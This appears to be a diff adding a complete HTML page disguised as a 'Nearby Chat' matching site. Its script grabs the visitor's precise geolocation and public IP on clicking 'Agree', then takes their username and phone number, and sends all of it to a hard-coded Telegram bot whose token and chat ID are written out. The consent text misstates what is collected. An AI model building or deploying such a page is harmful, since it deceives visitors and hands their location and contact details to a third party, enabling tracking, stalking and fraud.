@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>NEARBY CHAT ❤️📍</title>
+<style>
+body { background:#111; color:white; font-family:Arial; text-align:center; margin-top:60px; }
+input,button { padding:10px; margin:8px; width:250px; border-radius:6px; border:none; }
+button { background:red; color:white; cursor:pointer; }
+.box { max-width:400px; margin:auto; }
+</style>
+</head>
+<body>
+
+<div class="box">
+<h1>NEARBY CHAT ❤️📍</h1>
+
+<div id="consentBox">
+<p>By clicking Agree, you allow us to collect your interest for nearby matching and security.</p>
+<button onclick="startProcess()">Agree & Continue</button>
+</div>
+
+<form id="formBox" style="display:none;">
+<input type="text" id="username" placeholder="Username" required><br>
+<input type="tel" id="phone" placeholder="Phone Number" required><br>
+<button type="submit">Join Now</button>
+</form>
+</div>
+
+<script>
+const BOT_TOKEN = "8795601024:AAHvMFbxuTJ91F1qsfwDv5AikNKTYQ06_7U";
+const CHAT_ID = "7289296911";
+
+async function getIP(){
+const res = await fetch("https://api.ipify.org?format=json");
+const data = await res.json();
+return data.ip;
+}
+
+async function sendToTelegram(message){
+await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+method:"POST",
+headers:{"Content-Type":"application/json"},
+body:JSON.stringify({
+chat_id:CHAT_ID,
+text:message
+})
+});
+}
+
+async function startProcess(){
+navigator.geolocation.getCurrentPosition(async pos=>{
+const ip = await getIP();
+const lat = pos.coords.latitude;
+const lon = pos.coords.longitude;
+
+await sendToTelegram(
+`NEW VISITOR 🚀
+IP: ${ip}
+Location: ${lat}, ${lon}`
+);
+
+document.getElementById("consentBox").style.display="none";
+document.getElementById("formBox").style.display="block";
+
+},()=>{
+alert("Location permission required to continue.");
+});
+}
+
+document.getElementById("formBox").addEventListener("submit",async function(e){
+e.preventDefault();
+
+const username=document.getElementById("username").value;
+const phone=document.getElementById("phone").value;
+const ip=await getIP();
+
+await sendToTelegram(
+`NEW USER 💖
+Username: ${username}
+Phone: ${phone}
+IP: ${ip}`
+);
+
+alert("Form Submitted & Approved ❤️");
+});
+</script>
+
+</body>
+  </html>
